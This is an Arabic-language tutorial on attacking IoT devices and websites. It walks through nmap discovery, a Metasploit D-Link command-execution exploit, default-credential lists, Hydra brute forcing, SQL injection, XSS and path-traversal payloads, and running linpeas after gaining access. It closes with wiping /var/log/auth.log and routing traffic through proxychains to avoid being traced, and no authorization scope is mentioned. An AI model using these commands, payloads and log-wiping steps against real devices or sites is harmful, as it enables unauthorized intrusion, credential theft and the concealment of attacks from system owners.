## **📌 IoT Enumeration – فحص الثغرات في الأجهزة بعمق وبساطة 🔥**

---

## **🔍 1️⃣ يعني إيه فحص الثغرات في أجهزة الـ IoT؟ 🤔**

أجهزة إنترنت الأشياء (IoT) هي أي جهاز ذكي متصل بالإنترنت، زي:  
✅ **كاميرات المراقبة**  
✅ **أجهزة الراوتر**  
✅ **التلفزيونات الذكية**  
✅ **الأجهزة المنزلية الذكية (لمبات، حساسات، مكيفات، إلخ)**

🎯 **المشكلة**: أغلب الأجهزة دي بتكون ضعيفة من ناحية الأمان، والسبب:

- **كلمات مرور افتراضية ثابتة** (ناس كتير بتسيبها من غير تغيير).
- **وجود ثغرات معروفة في أنظمة التشغيل الخاصة بيها**.
- **استخدام بروتوكولات ضعيفة أو غير مشفرة** زي **Telnet, FTP, SNMP**.
- **تحديثات أمنية ضعيفة أو معدومة** من الشركات المصنعة.

---

## **📌 2️⃣ إزاي نعمل فحص للثغرات في الأجهزة دي؟ 🔍**

### **🛠️ 1- اكتشاف الأجهزة المتصلة بالشبكة**

✅ أول خطوة هي إننا نعرف إيه الأجهزة اللي شغالة على الشبكة. نستخدم Nmap لمسح الشبكة بالكامل:

```bash
nmap -sn 192.168.1.0/24
```

📌 **ده هيظهر لك كل الأجهزة المتصلة بالراوتر، مع الـ IP والـ MAC Address لكل جهاز.**

✅ لو عايز تعرف تفاصيل أكتر عن جهاز معين:

```bash
nmap -A 192.168.1.100
```

🔥 **ده هيكشف لك نظام التشغيل، الخدمات، والبورتات المفتوحة على الجهاز!**

---

### **🛠️ 2- البحث عن الخدمات والبورتات المفتوحة**

✅ لو جهاز IoT بيشتغل ببروتوكول معين، ممكن يكون فيه ثغرات!  
مثلاً، لو راوتر عليه **Telnet مفتوح**، ده معناه إنه غير آمن جدًا! 😱

📌 **جرب المسح التالي لمعرفة البورتات المفتوحة:**

```bash
nmap -sV -T4 192.168.1.100
```

🔥 **ده هيظهر كل الخدمات اللي شغالة على الجهاز وإصداراتها!**

✅ أشهر البورتات اللي ممكن تدل على مشكلة أمنية:

- **22 (SSH) – لو كان بيسمح بتسجيل الدخول من غير كلمة مرور!**
- **23 (Telnet) – مشفرش الاتصال، ممكن أي حد يتجسس عليه!**
- **80/443 (HTTP/HTTPS) – لو الجهاز بيشتغل بواجهة ويب ضعيفة الحماية!**
- **161 (SNMP) – ممكن يكشف معلومات حساسة عن الجهاز!**

---

### **🛠️ 3- البحث عن ثغرات معروفة للجهاز**

✅ لو عرفت نوع وإصدار الجهاز، دور على الثغرات بتاعته في قواعد البيانات المعروفة:

**📌 البحث في قاعدة بيانات Exploit-DB:**

```bash
searchsploit D-Link Router
```

🔥 **لو الجهاز فيه ثغرة، ممكن تستخدمها مباشرة في الاختراق!**

✅ أو استخدم موقع **CVE Details** للبحث عن ثغرات الجهاز:

```
https://cvedetails.com/
```

📌 **لو لقيت ثغرة، شوف هل ليها Exploit جاهز ولا تحتاج تعديل يدوي.**

---

### **🛠️ 4- تجربة استغلال الثغرات واختبار الاختراق**

#### **✅ أ) استخدام Metasploit لو فيه Exploit جاهز**

```bash
msfconsole
search dlink
use exploit/linux/http/dlink_command_exec
set RHOSTS 192.168.1.100
exploit
```

🔥 **ده لو فيه ثغرة معروفة في الراوتر، هيحاول ينفذ أوامر عليه!**

#### **✅ ب) تجربة كلمات المرور الافتراضية (Default Credentials)**

📌 معظم الأجهزة الذكية بتيجي بكلمات مرور افتراضية زي:

```
admin:admin
root:root
admin:1234
```

✅ جرب تدخل على صفحة تسجيل الدخول للجهاز (مثلاً [http://192.168.1.100)،](http://192.168.1.xn--100\)-81f/) ولو مشتغلش، استخدم **Brute Force Attack** بأداة **Hydra**:

```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

🔥 **ده هيجرب كل كلمات المرور لحد ما يلاقي الصح!**

---

## **💡 الخلاصة بالعامية:**

1️⃣ **بنشوف إيه الأجهزة المتصلة بالشبكة باستخدام Nmap.**  
2️⃣ **بندور على الخدمات والبورتات المفتوحة، ونشوف لو فيه حاجة ضعيفة زي Telnet أو HTTP بدون تشفير.**  
3️⃣ **بندور على ثغرات معروفة للجهاز في Exploit-DB أو CVE Details.**  
4️⃣ **لو لقينا ثغرة، بنجرب نستغلها ب Metasploit أو نحاول نخمن الباسورد لو الجهاز بيستخدم الإعدادات الافتراضية.**  
🚀 **ببساطة، الأجهزة دي ممكن تكون بوابة سهلة للاختراق لو مش مؤمنة كويس! 😈**

---

# **📌 خطوات عملية كاملة لـ Web Penetration Testing 💻🔥**

💡 **دي خطة عملية متكاملة لأي اختبار اختراق لموقع ويب!**

### **📌 1️⃣ جمع المعلومات (Information Gathering)**

✅ استخدم **whois** لجمع بيانات عن الدومين:

```bash
whois example.com
```

✅ استخدم **Subdomain Enumeration** لاكتشاف النطاقات الفرعية:

```bash
subfinder -d example.com
```

✅ استخدم **Google Dorking** لاكتشاف الصفحات المخفية:

```bash
site:example.com inurl:admin
```

---

### **📌 2️⃣ فحص الثغرات (Scanning for Vulnerabilities)**

✅ **استخدم Nmap لفحص البورتات المفتوحة:**

```bash
nmap -A example.com
```

✅ **استخدم Nikto لفحص مشاكل الأمان في السيرفر:**

```bash
nikto -h http://example.com
```

✅ **استخدم SQLmap لاختبار SQL Injection:**

```bash
sqlmap -u "http://example.com/login.php?id=1" --dbs
```

---

### **📌 3️⃣ تجربة الاستغلال (Exploitation)**

✅ **اختبار SQL Injection يدويًا:**  
حاول تضيف `' OR 1=1 --` في حقول تسجيل الدخول وشوف النتيجة!  
✅ **اختبار XSS:**  
حاول تضيف `<script>alert('XSS')</script>` في أي مدخل بيانات وشوف لو ظهر تنبيه.  
✅ **اختبار LFI/RFI:**  
جرب `http://example.com/page.php?file=../../etc/passwd`

---

### **📌 4️⃣ رفع الامتيازات (Privilege Escalation)**

✅ **لو دخلت على السيرفر، دور على معلومات حساسة:**

```bash
find / -type f -name "*.conf"
```

✅ **جرب تستغل الـ Sudo Permissions:**

```bash
sudo -l
```

✅ **استخدم أدوات مثل Linpeas لاكتشاف الثغرات في السيرفر**

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

### **📌 5️⃣ تنظيف الأثر (Clearing Tracks)**

✅ **حذف أي Logs:**

```bash
echo > /var/log/auth.log
```

✅ **تشفير الاتصال أثناء الاختبار:**  
استخدم **Proxychains** و **VPN** أثناء تنفيذ الاختبار لتجنب التتبع!

---

💡 **الخلاصة:**  
1️⃣ **ابدأ بجمع المعلومات عن الموقع.**  
2️⃣ **افحص البورتات والثغرات باستخدام أدوات زي Nmap و SQLmap.**  
3️⃣ **جرب استغلال الثغرات يدويًا أو باستخدام Metasploit.**  
4️⃣ **لو اخترقت الموقع، جرب ترفع صلاحياتك وتبحث عن البيانات الحساسة.**  
5️⃣ **نظّف أثرك عشان ميتعرفش إنك دخلت!**

🚀 **بكده تقدر تعمل اختبار اختراق لأي موقع زي المحترفين! 🔥**